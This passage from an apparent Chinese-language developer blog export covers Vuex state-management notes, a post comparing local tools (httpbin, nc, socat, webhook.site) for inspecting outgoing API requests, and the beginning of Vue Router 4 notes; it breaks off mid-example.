[https://github.com/malagege/vuex-test/commit/d033910dafe268599615e67d374ecb33709cc5dc](https://github.com/malagege/vuex-test/commit/d033910dafe268599615e67d374ecb33709cc5dc)\n\n\n## commit 使用物件傳值\n\n```javascript=\nstore.commit({\n  type: 'increment',\n  amount: 10\n})\n```\n\n```javascript=\nmutations: {\n  increment (state, payload) {\n    state.count += payload.amount\n  }\n}\n```\n\nGIT: [https://github.com/malagege/vuex-test/commit/caa624c19d4741924f3abe5c9f6d0f5b93cb34f3](https://github.com/malagege/vuex-test/commit/caa624c19d4741924f3abe5c9f6d0f5b93cb34f3)\n\n\n\n### 使用常量替代 Mutation 事件類型\n\n> 使用常量替代 mutation 事件類型在各種 Flux 實現中是很常見的模式。這樣可以使 linter 之類的工具發揮作用，同時把這些常量放在單獨的文件中可以讓你的代碼合作者對整個 app 包含的 mutation 一目瞭然：\n\n```javascript=\n// mutation-types.js\nexport const SOME_MUTATION = 'SOME_MUTATION'\n\n```\n\n```javascript=\n// store.js\nimport { createStore } from 'vuex'\nimport { SOME_MUTATION } from './mutation-types'\n\nconst store = createStore({\n  state: { ... },\n  mutations: {\n    // 我們可以使用 ES2015 風格的計算屬性命名功能來使用一個常量作為函數名\n    [SOME_MUTATION] (state) {\n      // 修改 state\n    }\n  }\n})\n\n```\n\n> 用不用常量取決於你——在需要多人協作的大型項目中，這會很有幫助。但如果你不喜歡，你完全可以不這樣做。\n\n\nGIT: [https://github.com/malagege/vuex-test/commit/00841e0ede5e9473df641eff3646f69dade93256](https://github.com/malagege/vuex-test/commit/00841e0ede5e9473df641eff3646f69dade93256)\n\n\n### Mutation 必須是同步函數\n\n> 一條重要的原則就是要記住 mutation 必須是同步函數。為什麼？請參考下面的例子：\n\n```javascript=\nmutations: {\n  someMutation (state) {\n    api.callAsyncMethod(() => {\n      state.count++\n    })\n  }\n}\n```\n\n> 現在想像，我們正在 debug 一個 app 並且觀察 devtool 中的 mutation 日誌。每一條 mutation 被記錄，devtools 都需要捕捉到前一狀態和後一狀態的快照。然而，在上面的例子中 mutation 中的異步函數中的回調讓這不可能完成：因為當 mutation 觸發的時候，回調函數還沒有被調用，devtools 不知道什麼時候回調函數實際上被調用——實質上任何在回調函數中進行的狀態的改變都是不可追蹤的。\n\n\n這邊參考範例調整:[手把手教你使用Vuex，猴子都能看懂的教程](https://juejin.cn/post/6928468842377117709)\n\n\n\n\n```javascript=\n// 創建一個新的 store 實例\nconst store = createStore({\n  state: {\n      name: '張三',\n      number: 0,\n  },\n  mutations: {\n      setNumberIsWhat(state, payload) {\n          setTimeout(() => {\n            state.number = payload.number;\n          }, 1000);\n      },\n  }\n});\n\n  \nconsole.log(`舊值：${store.state.number}`);\n\nstore.commit('setNumberIsWhat',{\n  number: 20\n})\n\n// await store.dispatch('setNum');\nconsole.log(`新值：${store.state.number}`);\n\n```\n\n#### 非同步測試\n\n```javascript=\n  mutations: {\n      setNumberIsWhat(state, payload) {\n          setTimeout(() => {\n            state.number = payload.number;\n          }, 1000);\n      },\n  }\n```\n\n\n結果:\n![](https://i.imgur.com/JbCEPWh.png)\n\nGIT: [https://github.com/malagege/vuex-test/commit/739138bbef8a7ed162456fafbf7a9d5808b4f1d2](https://github.com/malagege/vuex-test/commit/739138bbef8a7ed162456fafbf7a9d5808b4f1d2)\n\n#### 同步測試\n\n```javascript=\n  mutations: {\n      setNumberIsWhat(state, payload) {\n          // setTimeout(() => {\n            state.number = payload.number;\n          // }, 1000);\n      },\n  }\n```\n\n結果:\n![](https://i.imgur.com/SMoKaQW.png)\n\n\n這邊結果來看，官方`Mutition`為什麼會關連`DevTools`原因所在。\n\n![](https://i.imgur.com/HBeN483.png)\n\n\n###  mapMutation\n\n\n```javascript=\nimport { mapMutations } from 'vuex'\n\nexport default {\n  // ...\n  methods: {\n    ...mapMutations([\n      'increment', // 將 `this.increment()` 映射為 `this.$store.commit('increment')`\n\n      // `mapMutations` 也支持載荷：\n      'incrementBy' // 將 `this.incrementBy(amount)` 映射為 `this.$store.commit('incrementBy', amount)`\n    ]),\n    ...mapMutations({\n      add: 'increment' // 將 `this.add()` 映射為 `this.$store.commit('increment')`\n    })\n  }\n}\n\n```\n\n\n用法跟之前差不多。\n\n\n### 心得整理\n\n其實當初看的時候一直在想為什麼要分 `Mutation` 和 `Action`，其實不照這樣做，程式也是可以使用的，但是這樣做的話，程式可能不容易看，維護上也不方便。`Mutation`觸發是透過`store.commit`去操作，在使用上跟 Web 觸發事件(Event)很像。\n\n奇怪?我的程式沒有很複雜動作，一定要經過 Action 嗎?目前我看，應該也可以`Component method`，畢竟官方都給了 `mapMutation`不用嗎?XD\n\n\n\n## Action\n\n\n>Action 類似於 mutation，不同在於：\n>\n>  -  Action 提交的是 mutation，而不是直接變更狀態(state)。\n>  -  Action 可以包含任意異步操作。\n\n```javascript=\nconst store = createStore({\n  state: {\n    count: 0\n  },\n  mutations: {\n    increment (state) {\n      state.count++\n    }\n  },\n  actions: {\n    increment (context) {\n      context.commit('increment')\n    }\n  }\n})\n\n```\n\n\n> Action 函數接受一個與 store 實例具有相同方法和屬性的 context 對象，因此你可以調用 context.commit 提交一個 mutation，或者通過 context.state 和 context.getters 來獲取 state 和 getters。當我們在之後介紹到 Modules 時，你就知道 context 對象為什麼不是 store 實例本身了。\n\n\n> 實踐中，我們會經常用到 ES2015 的參數解構來簡化代碼（特別是我們需要調用 commit 很多次的時候）：\n\n[lukehoban/es6features: Overview of ECMAScript 6 features](https://github.com/lukehoban/es6features#destructuring)\n\n```javascript=\nactions: {\n  increment ({ commit }) {\n    commit('increment')\n  }\n}\n```\n\n\n### 分發 Action\n\n> Action 通過 store.dispatch 方法觸發\n\n```javascript=\nstore.dispatch('increment')\n```\n\n![](https://i.imgur.com/dfPPjVP.png)\n\nGIT: [https://github.com/malagege/vuex-test/commit/637dfc3482613d86027ee32af369ede218793438](https://github.com/malagege/vuex-test/commit/637dfc3482613d86027ee32af369ede218793438)\n\n> 乍一眼看上去感覺多此一舉，我們直接分發 mutation 豈不更方便？實際上並非如此，還記得 mutation 必須同步執行這個限制麼？Action 就不受約束！我們可以在 action 內部執行異步操作：\n\n```javascript=\nactions: {\n  incrementAsync ({ commit }) {\n    setTimeout(() => {\n      commit('increment')\n    }, 1000)\n  }\n}\n```\n\n> Actions 支持同樣的載荷(payload)方式和物件方式進行分發：\n\n```javascript=\n// 以載荷形式分發\nstore.dispatch('incrementAsync', {\n  amount: 10\n})\n\n// 以物件形式分發\nstore.dispatch({\n  type: 'incrementAsync',\n  amount: 10\n})\n\n```\n\nGIT: [https://github.com/malagege/vuex-test/commit/c0de63b661c0addc1edc6e24da3cb920cd242ab3](https://github.com/malagege/vuex-test/commit/c0de63b661c0addc1edc6e24da3cb920cd242ab3)\n\n> 來看一個更加實際的購物車示例，涉及到調用異步 API 和分發多重 mutation：\n\n```javascript=\nactions: {\n  checkout ({ commit, state }, products) {\n    // 把當前購物車的物品備份起來\n    const savedCartItems = [...state.cart.added]\n    // 發出結賬請求，然後樂觀地清空購物車\n    commit(types.CHECKOUT_REQUEST)\n    // 購物 API 接受一個成功回調和一個失敗回調\n    shop.buyProducts(\n      products,\n      // 成功操作\n      () => commit(types.CHECKOUT_SUCCESS),\n      // 失敗操作\n      () => commit(types.CHECKOUT_FAILURE, savedCartItems)\n    )\n  }\n}\n```\n\n\n\n### 在組件中分發 Action(mapActions)\n\n> 你在組件中使用 `this.$store.dispatch('xxx')` 分發 action，或者使用 mapActions 輔助函數將組件的 methods 映射為 store.dispatch 調用（需要先在根節點注入 store）：\n\n```javascript=\nimport { mapActions } from 'vuex'\n\nexport default {\n  // ...\n  methods: {\n    ...mapActions([\n      'increment', // 將 `this.increment()` 映射為 `this.$store.dispatch('increment')`\n\n      // `mapActions` 也支持載荷：\n      'incrementBy' // 將 `this.incrementBy(amount)` 映射為 `this.$store.dispatch('incrementBy', amount)`\n    ]),\n    ...mapActions({\n      add: 'increment' // 將 `this.add()` 映射為 `this.$store.dispatch('increment')`\n    })\n  }\n}\n\n```\n\n### 組合 Action(重點)\n\n> Action 通常是異步的，那麼如何知道 action 什麼時候結束呢？更重要的是，我們如何才能組合多個 action，以處理更加複雜的異步流程？\n\n>　首先，你需要明白 store.dispatch 可以處理被觸發的 action 的處理函數返回的 Promise，並且 store.dispatch 仍舊返回 Promise：\n\n```javascript=\nactions: {\n  actionA ({ commit }) {\n    return new Promise((resolve, reject) => {\n      setTimeout(() => {\n        commit('someMutation')\n        resolve()\n      }, 1000)\n    })\n  }\n}\n```\n\n> 現在你可以：\n\n```javascript=\nstore.dispatch('actionA').then(() => {\n  // ...\n})\n```\n\n> 在另外一個 action 中也可以：\n\n```javascript=\nactions: {\n  // ...\n  actionB ({ dispatch, commit }) {\n    return dispatch('actionA').then(() => {\n      commit('someOtherMutation')\n    })\n  }\n}\n```\n\n> 最後，如果我們利用 async / await，我們可以如下組合 action：\n\n```javascript=\n// 假設 getData() 和 getOtherData() 返回的是 Promise\n\nactions: {\n  async actionA ({ commit }) {\n    commit('gotData', await getData())\n  },\n  async actionB ({ dispatch, commit }) {\n    await dispatch('actionA') // 等待 actionA 完成\n    commit('gotOtherData', await getOtherData())\n  }\n}\n\n```\n\nGIT: [https://github.com/malagege/vuex-test/commit/4d639191a71bd674fffc7593a097f44673dcdf63](https://github.com/malagege/vuex-test/commit/4d639191a71bd674fffc7593a097f44673dcdf63)\n\n![](https://i.imgur.com/YWfOr7k.png)\n\n\n### Mutation / Action 差異\n\n| \\                | Mutation | Action   |\n|------------------|----------|----------|\n| 呼叫               | commit   | dispatch |\n| 呼叫Function 第一個參數 | State    | Context  |\n| 限制               | 不可用非同步   | 可用非同步    |\n\n乍看之下，Mutation 和 Action 真的很像，但是 Mutation 主要修改 State ，所以 Function 第一個參數是 `State`。Action 可以做很多事情(取API資料、取 State 資料...)，我原本以為取 State 都要在所有 Component 去做，但 Action 應該也能做到??但感覺用外面帶進去會比較好?(符合DI原則)，之後有確定答案再補充...\n\n### mapMutations,mapActions 會自動映射 payload\n\n實作使用mapMutations, mapActions，發現想帶入 payload ，但mapMutations / mapActions 都可以映射參數。官方文件就有說明。~~一不小心就漏掉，我真是後知後覺~~\n\n```javascript=\n    ...mapActions([\n      // `mapActions` 也支持載荷：\n      'incrementBy' // 將 `this.incrementBy(amount)` 映射為 `this.$store.dispatch('incrementBy', amount)`\n    })\n```\n\n\n### mapState,mapGetters,mapMutations,mapActions\n\n這邊我發現 mapXXX，只有 State 是單數，其他都是複數。我覺得我之後可能會忘記，特別說一下。簡單來說，State 只有一個，Getters,Mutations,Actions有很多 function 組成。這樣記應該會比較好。\n\n\n### 該加強 Promise / Async\n\n看本篇 Action 範例，有許多 Promse / Async 用法，讓我覺得還可以這樣用!!可能有空要加強一下，希望自己使用不會用到爆炸，哈哈。\n\n\n## Module\n\n看到很多教學沒有交到 Module，因為我覺得 Vuex 文章不多，想說把他看完。除非遇到不會的，例如 v-solt 不會，就先跳過。\n\n> 為瞭解決以上問題，Vuex 允許我們將 store 分割成模塊（module）。每個模塊擁有自己的 state、mutation、action、getter、甚至是嵌套子模塊——從上至下進行同樣方式的分割：\n\n```javascript=\nconst moduleA = {\n  state: () => ({ ... }),\n  mutations: { ... },\n  actions: { ... },\n  getters: { ... }\n}\n\nconst moduleB = {\n  state: () => ({ ... }),\n  mutations: { ... },\n  actions: { ... }\n}\n\nconst store = createStore({\n  modules: {\n    a: moduleA,\n    b: moduleB\n  }\n})\n\nstore.state.a // -> moduleA 的狀態\nstore.state.b // -> moduleB 的狀態\n\n```\n\n### 模塊的局部狀態(使用rootState)\n\n> 對於模塊內部的 mutation 和 getter，接收的第一個參數是模塊的局部狀態對象。\n\n#### 一般常用第一參數\n\n```javascript=\nconst moduleA = {\n  state: () => ({\n    count: 0\n  }),\n  mutations: {\n    increment (state) {\n      // 這裡的 `state` 對象是模塊的局部狀態\n      state.count++\n    }\n  },\n\n  getters: {\n    doubleCount (state) {\n      return state.count * 2\n    }\n  }\n}\n\n```\n\n\n#### Action\n\n```javascript=\nconst moduleA = {\n  // ...\n  actions: {\n    incrementIfOddOnRootSum ({ state, commit, rootState }) {\n      if ((state.count + rootState.count) % 2 === 1) {\n        commit('increment')\n      }\n    }\n  }\n}\n\n```\n\n\n\n#### Getter\n\n```javascript=\nconst moduleA = {\n  // ...\n  getters: {\n    sumWithRootCount (state, getters, rootState) {\n      return state.count + rootState.count\n    }\n  }\n}\n\n```\n\n\n### 命名空間(預設全域)\n\nGetter , Action, Mutation 都是全局宣告的。仔細想想也對，像 JavaScript 也是全域宣告 Event。\n\nVuex 也有做 `namesapce`， 參考官方範例也不難。 \n\n觀察幾點記錄一下:\n\n  1. 這邊我自己看 `namespace: true`，只宣告 `moduole`某屬性上面，不會加在 跟 store 上面，因為在跟 store 沒有甚麼意義。\n  2. module 裡面載入別的 module 會繼承父模塊的命名空間。參考下面官方範例: myPage\n  3. 內層 module 可以重新命名空間。參考下面範例: posts\n    \n```javascript=\nconst store = createStore({\n  modules: {\n    account: {\n      namespaced: true,\n\n      // 模塊內容（module assets）\n      state: () => ({ ... }), // 模塊內的狀態已經是嵌套的了，使用 `namespaced` 屬性不會對其產生影響\n      getters: {\n        isAdmin () { ... } // -> getters['account/isAdmin']\n      },\n      actions: {\n        login () { ... } // -> dispatch('account/login')\n      },\n      mutations: {\n        login () { ... } // -> commit('account/login')\n      },\n\n      // 嵌套模塊\n      modules: {\n        // 繼承父模塊的命名空間\n        myPage: {\n          state: () => ({ ... }),\n          getters: {\n            profile () { ... } // -> getters['account/profile']\n          }\n        },\n\n        // 進一步嵌套命名空間\n        posts: {\n          namespaced: true,\n\n          state: () => ({ ... }),\n          getters: {\n            popular () { ... } // -> getters['account/posts/popular']\n          }\n        }\n      }\n    }\n  }\n})\n\n```\n\n\n> 啟用了命名空間的 getter 和 action 會收到局部化的 getter，dispatch 和 commit。換言之，你在使用模塊內容（module assets）時不需要在同一模塊內額外添加空間名前綴。更改 namespaced 屬性後不需要修改模塊內的代碼。\n\n下面範例會看到，再進行比較。\n\n#### 在帶命名空間的模塊內訪問全域內容（Global Assets）\n\n> 如果你希望使用全局 state 和 getter，**rootState 和 rootGetters 會作為第三和第四參數傳入 getter，也會通過 context 對象的屬性傳入 action。**\n\n> 若需要在全局命名空間內分發 action 或提交 mutation，將 { root: true } 作為第三參數傳給 dispatch 或 commit 即可。\n\n參考官方範例就會了解。\n\n```javascript=\nmodules: {\n  foo: {\n    namespaced: true,\n\n    getters: {\n      // 在這個模塊的 getter 中，`getters` 被局部化了\n      // 你可以使用 getter 的第四個參數來調用 `rootGetters`\n      someGetter (state, getters, rootState, rootGetters) {\n        getters.someOtherGetter // -> 'foo/someOtherGetter'\n        rootGetters.someOtherGetter // -> 'someOtherGetter'\n      },\n      someOtherGetter: state => { ... }\n    },\n\n    actions: {\n      // 在這個模塊中， dispatch 和 commit 也被局部化了\n      // 他們可以接受 `root` 屬性以訪問根 dispatch 或 commit\n      someAction ({ dispatch, commit, getters, rootGetters }) {\n        getters.someGetter // -> 'foo/someGetter'\n        rootGetters.someGetter // -> 'someGetter'\n\n        dispatch('someOtherAction') // -> 'foo/someOtherAction'\n        dispatch('someOtherAction', null, { root: true }) // -> 'someOtherAction'\n\n        commit('someMutation') // -> 'foo/someMutation'\n        commit('someMutation', null, { root: true }) // -> 'someMutation'\n      },\n      someOtherAction (ctx, payload) { ... }\n    }\n  }\n}\n```\n\n這邊還有一點比較特別，**若需要在全局命名空間內分發 action 或提交 mutation，將 { root: true } 作為第三參數傳給 dispatch 或 commit 即可。**\n\n```javascript=\n        dispatch('someOtherAction') // -> 'foo/someOtherAction'\n        dispatch('someOtherAction', null, { root: true }) // -> 'someOtherAction'\n\n        commit('someMutation') // -> 'foo/someMutation'\n        commit('someMutation', null, { root: true }) // -> 'someMutation'\n```\n\n\n###  在帶命名空間的模塊註冊全局 action\n\n> 若需要在帶命名空間的模塊註冊全局 action，你可添加 root: true，並將這個 action 的定義放在函數 handler 中。例如：\n\n```javascript=\n{\n  actions: {\n    someOtherAction ({dispatch}) {\n      dispatch('someAction')\n    }\n  },\n  modules: {\n    foo: {\n      namespaced: true,\n\n      actions: {\n        someAction: {\n          root: true,\n          handler (namespacedContext, payload) { ... } // -> 'someAction'\n        }\n      }\n    }\n  }\n}\n\n```\n\n老實說不太了解這邊能印用在哪邊，但是可以透過子組件宣告全域Action 事件。\n\n\n### 帶命名空間的綁定函數\n\n> 當使用 mapState、mapGetters、mapActions 和 mapMutations 這些函數來綁定帶命名空間的模塊時，寫起來可能比較繁瑣：\n\n```javascript=\ncomputed: {\n  ...mapState({\n    a: state => state.some.nested.module.a,\n    b: state => state.some.nested.module.b\n  })\n},\nmethods: {\n  ...mapActions([\n    'some/nested/module/foo', // -> this['some/nested/module/foo']()\n    'some/nested/module/bar' // -> this['some/nested/module/bar']()\n  ])\n}\n```\n\n> }\n\n對於這種情況，你可以將模塊的空間名稱字符串作為第一個參數傳遞給上述函數，這樣所有綁定都會自動將該模塊作為上下文。於是上面的例子可以簡化為：\n\n```javascript=\ncomputed: {\n  ...mapState('some/nested/module', {\n    a: state => state.a,\n    b: state => state.b\n  })\n},\nmethods: {\n  ...mapActions('some/nested/module', [\n    'foo', // -> this.foo()\n    'bar' // -> this.bar()\n  ])\n}\n```\n\n> 而且，你可以通過使用 createNamespacedHelpers 創建基於某個命名空間輔助函數。它返回一個對象，對象裡有新的綁定在給定命名空間值上的組件綁定輔助函數：\n\n```javascript=\nimport { createNamespacedHelpers } from 'vuex'\n\nconst { mapState, mapActions } = createNamespacedHelpers('some/nested/module')\n\nexport default {\n  computed: {\n    // 在 `some/nested/module` 中查找\n    ...mapState({\n      a: state => state.a,\n      b: state => state.b\n    })\n  },\n  methods: {\n    // 在 `some/nested/module` 中查找\n    ...mapActions([\n      'foo',\n      'bar'\n    ])\n  }\n}\n\n```\n\n後面就先跳過。[Module | Vuex](https://next.vuex.vuejs.org/zh/guide/modules.html#%E7%BB%99%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E8%80%85%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9)\n\n## 項目結構\n\n做前面其實我大概知道 store 可以拆出來一個 js，但我為了方便測試還是先放 main.js。\n\n官方還很好貼個範例: [vuex/examples/classic/shopping-cart at 4.0 · vuejs/vuex](https://github.com/vuejs/vuex/tree/4.0/examples/classic/shopping-cart)\n\n```javascript=\n├── index.html\n├── main.js\n├── api\n│   └── ... # 抽取出API請求\n├── components\n│   ├── App.vue\n│   └── ...\n└── store\n    ├── index.js          # 我們組裝模塊並導出 store 的地方\n    ├── actions.js        # 根級別的 action\n    ├── mutations.js      # 根級別的 mutation\n    └── modules\n        ├── cart.js       # 購物車模塊\n        └── products.js   # 產品模塊\n```\n\n\n##  組合式API\n\n```javascript=\nimport { useStore } from 'vuex'\n\nexport default {\n  setup () {\n    const store = useStore()\n  }\n}\n\n\n```\n\n這邊用法就跟之前差不多，所以就不貼了。可參考:[組合式API | Vuex](https://next.vuex.vuejs.org/zh/guide/composition-api.html#%E8%AE%BF%E9%97%AE-state-%E5%92%8C-getter)\n\n官方範例:[vuex/examples/composition at 4.0 · vuejs/vuex](https://github.com/vuejs/vuex/tree/4.0/examples/composition)\n\n\n## 嚴格模式\n\n```javascript=\nconst store = createStore({\n  // ...\n  strict: true\n})\n\n```\n\n![](https://i.imgur.com/PmhNNkR.png)\n\n\n### 開發環境與發佈環境\n\n```javascript=\nconst store = createStore({\n  // ...\n  strict: process.env.NODE_ENV !== 'production'\n})\n\n```\n\n\n## 表單處理\n\n```htmlembedded=\n<input v-model=\"message\">\n```\n\n```javascript=\ncomputed: {\n  message: {\n    get () {\n      return this.$store.state.obj.message\n    },\n    set (value) {\n      this.$store.commit('updateMessage', value)\n    }\n  }\n}\n\n```\n\n[表单处理 | Vuex](https://next.vuex.vuejs.org/zh/guide/forms.html)","tags":["vuex"],"categories":["Vue"]},{"title":"看 HTTP 和 HTTPS API 服務封包參數方法","url":"%2Fblog%2F2021%2F06%2F27%2F%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95%2F","content":"\n\n最近程式測試API，有時候好奇程式傳出去內容是否跟 Postman 一樣，但是 DEBUG 時候真的不方便。最近在想有什麼方法(或工具)可以做到?\n之前有看到有用 `SSLKEYLOGFILE` 可以用 Wireshark 解封包。[深入理解 TLS/SSL 安全加密協定](https://www.facebook.com/119279178101235/videos/374050803968418)\n雖然 Java 也有看到類似方法，但是要特別設定 [jSSLKeyLog](https://jsslkeylog.github.io/)，還要安裝 Wireshark 軟體，所以覺得很麻煩?\n最近看有沒有比較簡單方式測試?稍微爬一下文整理\n\n[HTTP test server accepting GET/POST requests - Stack Overflow](https://stackoverflow.com/questions/5725430/http-test-server-accepting-get-post-requests/)\n\n\n裡面看到 socat 大法最方便，可看封包又能轉傳！\n\n<!--more-->\n\n## Httpbin\n\n[httpbin.org](https://httpbin.org/)\n\n```shell=\ndocker run -p 80:80 kennethreitz/httpbin\n```\n\n但這點在程式直覺看結果還是很不方便\n\n## Post Test Server V2\n\n\n[PTS - V2](http://ptsv2.com/)\n\n有 http , https 方式接收資料，還算不錯。但沒有自己架設版本\n\n## nc\n\n推薦使用這個指令，簡單好用。不知道 socat 也能不能做到這種事情，還能順便轉送出去封包?XD(下面有實作出來)\n最大缺點應該就是不能 https \n\n```shell=\nnc -kdl localhost 8000\n\n```\n\n## socat \n\n**超級**推薦使用這個指令，可看到資料，又可以推送出去，不是很棒嗎!!連 https 都能搞定\n\n```shell=\nsocat -v TCP-LISTEN:8080,fork,reuseaddr TCP:tw.yahoo.com:80\n```\n\n```shell=\n# http to https\nsocat -v TCP-LISTEN:8080,fork,reuseaddr OPENSSL:web_url:443,verify=0\n# 測試用\ncurl -H Host:web_url http://localhost:8080/\n```\n\n這邊加 `verify=0` 是不能檢查憑證，這樣可以用瀏覽器看，但網站有做 Host 驗證的話，可以設定瀏覽器 Header設定 Host ，找[ModHeader - Chrome 線上應用程式商店](https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj/related)就能做到，不然就是改 Host檔案。這個是參考 Traefik 那篇([在 Raspberry PI 架設 Traefik 初體驗 | 程式狂想筆記](https://malagege.github.io/blog/2020/10/13/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/#%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95))\n\n相對，API 程式要加 Header，不然就是設定 Host 檔案，目前沒有找到 socat 修改 Header 方法。\n\n參考來源: [SSH over SSL, episode 2: replacing proxytunnel with socat](https://blog.chmd.fr/ssh-over-ssl-episode-2-replacing-proxytunnel-with-socat.html)\n\n## webhook.site\n\n[Webhook.site - Test, process and transform emails and HTTP requests](https://webhook.site/)\n\n之前 line webhook 時候有用這個測試，非常好用。缺點只能用 https ...，這算缺點嗎?(XD)\n我要用這個測試 Java 8 憑證不認得這個網站憑證...，官方也有`docker` 自架服務，不過我就沒有嘗試。\n\n\n## PutsReq \n\n[PutsReq](https://putsreq.com/)\n\n也是有不錯操作，但沒有自架服務。\n\n\n\n## 其他爬到東西\n\n[vi/websocat: Command-line client for WebSockets, like netcat (or curl) for ws:// with advanced socat-like functions](https://github.com/vi/websocat)\n","tags":["request"],"categories":["實用工具"]},{"title":" Vue Router 4 學習筆記","url":"%2Fblog%2F2021%2F06%2F27%2FVue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98%2F","content":"\n這篇 Vue Router 4 學習筆記，大部份都是抄[官方](https://next.router.vuejs.org/zh/)文件內容，有簡單實作小記，可參考 GIT 練習，算是自己學習重點筆記。\n\n<!--more-->\n\n## 安裝 Vue router 4\n\n```bash=\nnpm install vue-router@4\n```\n\n設定 main.js\n```javascript=\nimport { createApp } from 'vue'\nimport { createRouter, createWebHashHistory } from 'vue-router'\nimport App from './App.vue'\nimport Home from './components/Home.vue'\nimport About from './components/About.vue'\n\n// 2. 定義一些路由\n// 每個路由都需要映射到一個組件。\n// 我們後面再討論嵌套路由。\nconst routes = [\n    { path: '/', component: Home },\n    { path: '/about', component: About },\n  ]\n  \n// 3. 創建路由實例並傳遞 `routes` 配置\n// 你可以在這裡輸入更多的配置，但我們在這裡\n// 暫時保持簡單\nconst router = createRouter({\n    // 4. 內部提供了 history 模式的實現。為了簡單起見，我們在這裡使用 hash 模式。\n    history: createWebHashHistory(),\n    routes, // `routes: routes` 的縮寫\n  })\n  \n\ncreateApp(App).use(router).mount('#app')\n\n```\n\n重點提醒:\n1. import { createRouter, createWebHashHistory } from 'vue-router'\n2.  routes 宣告\n3. router 宣告(使用 createRouter, createWebHashHistory)\n4. createApp use vue-router\n\n\nApp.vue\n```htmlembedded=\n<template>\n  <h1>Hello App!</h1>\n  <p>\n    <!--使用 router-link 組件進行導航 -->\n    <!--通過傳遞 `to` 來指定鏈接 -->\n    <!--`<router-link>` 將呈現一個帶有正確 `href` 屬性的 `<a>` 標籤-->\n    <router-link to=\"/\">Go to Home</router-link>\n    <router-link to=\"/about\">Go to About</router-link>\n  </p>\n  <!-- 路由出口 -->\n  <!-- 路由匹配到的組件將渲染在這裡 -->\n  <router-view></router-view>\n</template>\n\n<script setup>\nimport Home from './components/Home.vue'\nimport About from './components/About.vue'\nimport HelloWorld from './components/HelloWorld.vue'\n\n// This starter template is using Vue 3 experimental <script setup> SFCs\n// Check out https://github.com/vuejs/rfcs/blob/script-setup-2/active-rfcs/0000-script-setup.md\n</script>\n\n<style>\n#app {\n  font-family: Avenir, Helvetica, Arial, sans-serif;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  text-align: center;\n  color: #2c3e50;\n  margin-top: 60px;\n}\n</style>\n\n```\n\n重點提醒\n1. `<router-link to=\"/\">Go to Home</router-link>` 超連結指定某路由\n2. `<router-view></router-view>` 路由顯示的Vue元件\n\n\nGIT:[8d7a44b6059b3caf6ad648056817af4c8ec9060c](https://github.com/malagege/vue-router-test/commit/8d7a44b6059b3caf6ad648056817af4c8ec9060c)\n\n> 要在 setup 函數中訪問路由，請調用 useRouter 或 useRoute 函數。我們將在 Composition API 中瞭解更多信息。\n> 在整個文檔中，我們會經常使用 router 實例，請記住，this.$router 與直接使用通過 createRouter 創建的 router 實例完全相同。我們使用 this.\\$router 的原因是，我們不想在每個需要操作路由的組件中都導入路由。\n\n引用一下官方這段，setup 函數可以用 `useRouter` 和 `useRoute`。 router 是指整個 router實例。 route 是指 `routes`某一個 route 設定。\n\n\n## 動態路由匹配\n\n[带参数的动态路由匹配 | Vue Router](https://next.router.vuejs.org/zh/guide/essentials/dynamic-matching.html)\n\n### 帶參數動態路由\n\n使用 $route.param\n\n| 匹配模式                           | 匹配路徑                     | $route.params                          |\n|--------------------------------|--------------------------|----------------------------------------|\n| /users/:username               | /users/eduardo           | { username: 'eduardo' }                |\n| /users/:username/posts/:postId | /users/eduardo/posts/123 | { username: 'eduardo', postId: '123' } |\n\n\nGIT:https://github.com/malagege/vue-router-test/commit/b1afcbb8fe9240e4851a680db958fafc558b6dd9\n\n### 響應路由參數的變化(重要)\n\n取得資料就是 AJAX 可用這個方式取得，後面會講到。\n\n```javascript=\nexport default {\n  created() {\n    this.$watch(\n      () => this.$route.params,\n      (toParams, previousParams) => {\n        console.log('toParams',toParams,'previsousParams',previousParams);\n      }\n    )\n  },\n}\n```\n\nwatch 跟 $watch 差別\n\n>    - $watch : 實體上的函數，使用此函數註冊監聽器。\n>    - watch : 實體上的屬性，此屬性設置的物件在實體建立時會叫用 $watch 註冊監聽器。\n>\n> $watch 是註冊監聽器的函數，而 watch 是為了開發者方便在實體上設置監聽器而提供的，其實 watch 本身也是使用 $watch 註冊監聽器。\n\n參考:\n- [監聽器( watch ) | 勇者鬥 Vue 龍](https://peterhpchen.github.io/VuejsQuest/basic/08_Watcher.html#%E4%BB%8B%E7%B4%B9)\n- [vue中watch和vm.$watch方法的區別？ - SegmentFault 思否](https://segmentfault.com/q/1010000023828086)\n\n\n使用 beforeRouteUpdate 導航守衛\n```javascript=\n//   使用 beforeRouteUpdate 導航守衛\n  async beforeRouteUpdate(to, from) {\n    // 對路由變化做出響應...\n    // this.userData = await fetchUser(to.params.id)\n    console.log('to',to,'from',from);\n  },\n}\n```\n\n簡單說明，第一次進來不會觸發上面兩個 function ，但第二次就會了。\n![](https://i.imgur.com/FK9JlKb.png)\n\n\nGIT: [9649555832b6732ed355f765b0047e733294f3a4](https://github.com/malagege/vue-router-test/commit/9649555832b6732ed355f765b0047e733294f3a4)\n\n###  捕獲所有路由或 404 Not found 路由\n\n\n\n```javascript=\nconst routes = [\n  // 將匹配所有內容並將其放在 `$route.params.pathMatch` 下\n  { path: '/:pathMatch(.*)*', name: 'NotFound', component: NotFound },\n  // 將匹配以 `/user-` 開頭的所有內容，並將其放在 `$route.params.afterUser` 下\n  { path: '/user-:afterUser(.*)', component: UserGeneric },\n]\n\n```\n\n```javascript=\nthis.$router.push({\n  name: 'NotFound',\n  params: { pathMatch: this.$route.path.split('/') },\n})\n\n```\n\n這邊我改變一下\n\n```javascript=\nexport default {\n    methods:{\n        test(){\n            console.log(this.$route.path.split('/'));\n            this.$router.push({\n            name: 'NotFound',\n            // :pathMatch 為 下面參數可以帶入\n            // http://localhost:3000/#/123/456\n            params: { pathMatch: ['123','456'] },\n            })\n        }\n    